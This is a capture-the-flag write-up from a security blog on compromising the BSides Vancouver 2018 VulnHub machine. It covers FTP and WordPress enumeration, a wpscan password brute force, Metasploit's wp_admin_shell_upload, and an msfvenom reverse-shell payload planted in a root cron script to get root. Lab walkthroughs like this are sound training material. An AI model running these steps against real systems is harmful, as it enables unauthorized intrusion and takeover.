<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/ctf-challenges/" rel="category tag">CTF Challenges</a>, <a href="https://www.hackingarticles.in/category/ctf-challenges/vulnhub/" rel="category tag">VulnHub</a></span>            </div>
            <h1 class="post-title entry-title">Hack the BSides Vancouver:2018 VM (Boot2Root Challenge)</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/hack-the-bsides-vancouver2018-vm-boot2root-challenge/" rel="bookmark"><time class="entry-date published" datetime="2018-04-04T17:22:30+00:00">April 4, 2018</time><time class="updated" datetime="2025-06-10T20:12:22+00:00">June 10, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p><span style="color: #000000;">Hello friends! Today we are going to take another CTF challenge known as <strong>BSides Vancouver</strong>. The credit for making this VM machine goes to “Abatchy” and it is another capture the flag challenge in which our goal is to gain root access and capture the flag to complete the challenge. You can download this VM <a style="color: #000000;" href="https://www.vulnhub.com/entry/bsides-vancouver-2018-workshop,231/"><strong>here</strong></a>.</span></p>
<p><span style="color: #000000;"><strong>Let’s Breach!!!</strong></span></p>
<p><span style="color: #000000;">Let’s start from getting to know the IP of VM  with help of <strong>netdiscover</strong> Command (Here, I have it at 192.168.1.103 but you will have to find your own). Now let’s move towards enumeration in context to identify running services and open of victim’s machine by using the most popular tool Nmap.</span></p>
<pre class="lang:default decode:true">nmap -p- -A 192.168.1.103 --open</pre>
<p><span style="color: #000000;"><strong>Awesome!!</strong> Nmap has done a remarkable job by dumbing the details of services running on open port 21, 22 and 80.</span></p>
<p><span style="color: #000000;">Moreover, the highlighted text is revealing the following details:</span></p>
<ul>
<li><span style="color: #000000;">FTP <strong>Anonymous login</strong> allowed</span></li>
<li><span style="color: #000000;">Found a directory /<strong>backup WordPress </strong>with help of <strong>txt</strong></span></li>
</ul>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qCre6ntTZKA/WsUHPDS6aZI/AAAAAAAAWD8/BgGFgID_SfcTuT1WGlJX6ZedctSR3-zAQCLcBGAs/s1600/1.png"/></span></p>
<p><span style="color: #000000;">Without wasting time we accessed the FTP service of the victim’s system and found a <strong>user.txt.bk</strong>, let’s look into this file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-GTWK8nfgj9Y/WsUHSYi37WI/AAAAAAAAWEc/-jeGHgWR0dAkCDNjTCau_hxTOCuJi4E-wCLcBGAs/s1600/5.png"/></span></p>
<p><span style="color: #000000;">Its look like a text file with some username in it. Since port 22 is open so we can use these name for login into ssh if possible.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-T8CK7kfREUw/WsUHSjE1ZsI/AAAAAAAAWEg/mONjt4LU-qo9Irtt9FKjZLQBUthF27WiQCLcBGAs/s1600/6.png"/></span></p>
<p><span style="color: #000000;">If you recall nmap result then it has shown <strong>/back_wordpress</strong> directory which we had to explore in our web browser but Sadly we didn’t get anything from this web page although it sounds for WordPress site which is also a good sing.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://2.bp.blogspot.com/-K_LHwsfGXiA/WsUHTGF5PtI/AAAAAAAAWEk/oL_zHk83RdkBVdV2YLj3Z4BXSKU0OZCxQCLcBGAs/s1600/7.png"/></span></p>
<p><span style="color: #000000;">Now we decided to use<strong> </strong>the command on the URL that we have entered in the browser. To check if there are any kind of vulnerable themes, plugins, username and etc.</span></p>
<pre class="lang:default decode:true">wpscan –u http://192.168.1.103/backup_wordpress/ --enumerate t --enumerate p --enumerate u</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-0DEj9CkuFBE/WsUHTROIoEI/AAAAAAAAWEo/E0hjAoa_L5MwAd8w7pUkP0jxcrkYzdIWwCLcBGAs/s1600/8.png"/></span></p>
<p><span style="color: #000000;">The<strong> wpscan </strong>has enumerated the usernames where we have found the login credentials as <strong>admin </strong>and <strong>John</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-a1LEo2fG-Rc/WsUHTt1GioI/AAAAAAAAWEs/7ptth7vnqLMORm4ETYW2H-yDdSjbAcaZQCLcBGAs/s1600/9.png"/></span></p>
<p><span style="color: #000000;">Again we have used wpscan to find out the password credentials for the login credentials john. Here we have used the following command to enumerate the password from the rockyou.txt file.</span></p>
<pre class="lang:default decode:true">wpscan –u http://192.168.1.103/backup_wordpress --username john --wordlist /usr/share/wordlists/rockyou.txt</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-FLmfEG8cAV4/WsUHOuGIueI/AAAAAAAAWD0/V7-BnJF0QTE_O1ShFVGofBbJrabafJ67gCLcBGAs/s1600/10.png"/></span></p>
<p><span style="color: #000000;">We see that for login credentials <strong>john</strong>, the password credentials matched is <strong>enigma</strong>.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-3m3VWVjUvEk/WsUHPAqRHrI/AAAAAAAAWD4/TOUpBNlk07sayl36yCmVh_ogAGcEu5N0wCLcBGAs/s1600/11.1.png"/></span></p>
<p><span style="color: #000000;">After finding the username and password, we have used metasploit’s exploit <strong>wp_admin_shell_upload</strong> to upload the shell and get the meterpreter which is shown below.</span></p>
<pre class="lang:default decode:true">use exploit/unix/webapp/wp_admin_shell_upload
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set rhost 192.168.1.103
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set targeturi /backup-wordpress
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set username john
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;set password enigma
msf exploit(unix/webapp/wp_admin_shell_upload) &gt;exploit</pre>
<p><span style="color: #000000;"><strong>Great!!</strong> We had compromise confidentiality of the target’s system now penetrate more for completing this challenge.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-6LtSiIqrtPY/WsUHP9hQ-QI/AAAAAAAAWEA/1t-mMGaRDAAu8ggfKOeRVqZ7cLf7CtaKACLcBGAs/s1600/11.png"/></span></p>
<p><span style="color: #000000;">We start penetrating targets machine and after 10-15 mints we came to know about a cleanup file which has root privilege from inside contents of crontab file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-zTEipTHHxe0/WsUHQMhiUfI/AAAAAAAAWEE/h3r5014Sg7k7M1j_rYHuVY9Cf4Ms7Ie3QCLcBGAs/s1600/22.png"/></span></p>
<p><span style="color: #000000;">Then we downloaded cleanup file on our desktop so that we can modify it by editing our malicious code.</span></p>
<pre class="lang:default decode:true">meterpreter&gt; download cleanup /root/Desktop/</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-2xPGvrOQOxA/WsUHQRagYiI/AAAAAAAAWEI/yRHNb55gAKcB7eEuuhWAj_9QfsHh_hiZQCLcBGAs/s1600/23.png"/></span></p>
<p><span style="color: #000000;">Using msfvenom we had generated a malicious python code by executing following command.</span></p>
<pre class="lang:default decode:true">msfvenom -p cmd/unix/reverse_python lhost=192.168.1.108 lport=9876 R</pre>
<p><span style="color: #000000;">Then copy the highlighted code for editing into the cleanup file.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ghSHzrXA3XQ/WsUHQ3MIapI/AAAAAAAAWEM/bNTnuR9fFFUnFpv60CWps2rwFnoH-AQeQCLcBGAs/s1600/25.png"/></span></p>
<p><span style="color: #000000;">We had paste above copied text as the inside cleanup file as shown in below image. In a new terminal, we had start netcat for listening reverse connection.</span></p>
<pre class="lang:default decode:true">nc -lvp 9876</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-5K4nugjX9sw/WsUHRNB4j6I/AAAAAAAAWEQ/NGpGW1DjUf4_TkI1OBFZJ-RA3UQ5W9QagCLcBGAs/s1600/26.png"/></span></p>
<p><span style="color: #000000;">Now we had to transfer our malicious cleanup file into current directory i.e. <strong>/usr/local/bin </strong>and verify it using cat command.</span></p>
<pre class="lang:default decode:true ">meterpreter&gt; upload /root/Desktop/cleanup .
meterpreter&gt;cat cleanup</pre>
<p><span style="color: #000000;"><img decoding="async" src="https://3.bp.blogspot.com/-7F0_K4IteoI/WsUHRfMi3LI/AAAAAAAAWEU/GeyzMu4QIEgQVY3bC_UjJCxXOuWrNsFNQCLcBGAs/s1600/27.png"/></span></p>
<p><span style="color: #000000;">WOW, we got the reverse connection from victims system with root access now let’s catch the flag and finished the task.</span></p>
<pre class="lang:default decode:true">id
cd /root
cat flag.txt</pre>
<p><span style="color: #000000;">solving the challenge in this lab is not that much hectic therefore it is a good task for beginners.</span></p>
<p><span style="color: #000000;"><img decoding="async" src="https://4.bp.blogspot.com/-7Ob_THMAFFI/WsUHR1Y5l-I/AAAAAAAAWEY/cKgUoyw-U0YW2Ax_kjq6ngjwAxGJT0IJgCLcBGAs/s1600/28.png"/></span></p>
<p><span style="color: #000000;"><strong>Author: </strong>AArti Singh is a Researcher and Technical Writer at Hacking Articles an Information Security Consultant Social Media Lover and Gadgets. Contact<strong><a style="color: #000000;" href="https://www.linkedin.com/in/aarti--singh/"> here</a></strong></span></p>
<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
